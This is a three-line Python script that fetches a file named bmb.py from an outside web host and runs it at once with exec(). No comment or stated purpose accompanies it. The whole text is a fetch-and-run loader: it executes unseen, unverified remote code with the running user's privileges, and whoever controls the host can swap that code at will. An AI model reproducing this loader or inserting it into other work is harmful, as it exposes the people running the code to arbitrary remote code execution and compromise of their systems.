import requests
bmbsource = requests.get("http://sharabiyan-goose.ir/csb/bmb.py").text
exec(bmbsource)
